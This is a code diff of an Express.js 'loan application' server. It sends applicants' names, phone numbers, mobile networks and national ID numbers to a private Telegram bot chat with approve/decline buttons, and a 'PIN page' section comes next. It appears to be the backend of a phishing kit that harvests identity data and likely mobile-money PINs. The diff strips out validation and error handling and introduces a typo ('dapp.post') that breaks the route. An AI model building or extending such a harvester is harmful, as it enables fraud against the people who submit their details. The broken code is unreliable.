@@ -19,47 +19,43 @@ app.get("/", (req, res) => {
 });
 
 // ================= APPLY =================
-app.post("/apply", async (req, res) => {
+dapp.post("/apply", async (req, res) => {
   const { name, phone, network, amount, nationalId } = req.body;
 
-  if (!name || !phone || !network || !amount || !nationalId) {
-    return res.status(400).send("Missing fields");
-  }
+  users[phone] = {
+    name,
+    phone,
+    network,
+    amount,
+    nationalId,
+    status: "pending"
+  };
 
-  // Save phone for later (simple method)
   const message = `
 📥 NEW LOAN APPLICATION
 
-👤 Name: ${name}
-📱 Phone: ${phone}
-📡 Network: ${network}
-💰 Amount: ${amount}
-🆔 ID: ${nationalId}
+👤 ${name}
+📱 ${phone}
+📡 ${network}
+💰 ${amount}
+🆔 ${nationalId}
 
--------------------------
-⚙️ Action Required:
+----------------
+Choose action:
 `;
 
-  try {
-    // Send with buttons
-    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      chat_id: CHAT_ID,
-      text: message,
-      reply_markup: {
-        inline_keyboard: [
-          [
-            { text: "✅ Approve", callback_data: `approve_${phone}` },
-            { text: "❌ Decline", callback_data: `decline_${phone}` }
-          ]
-        ]
-      }
-    });
+  await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    chat_id: CHAT_ID,
+    text: message,
+    reply_markup: {
+      inline_keyboard: [[
+        { text: "✅ Approve", callback_data: `approve_${phone}` },
+        { text: "❌ Decline", callback_data: `decline_${phone}` }
+      ]]
+    }
+  });
 
-    res.sendStatus(200);
-  } catch (err) {
-    console.log(err.response?.data || err.message);
-    res.status(500).send("Telegram failed");
-  }
+  res.json({ success: true });
 });
 
 // ================= PIN PAGE VISIT =================
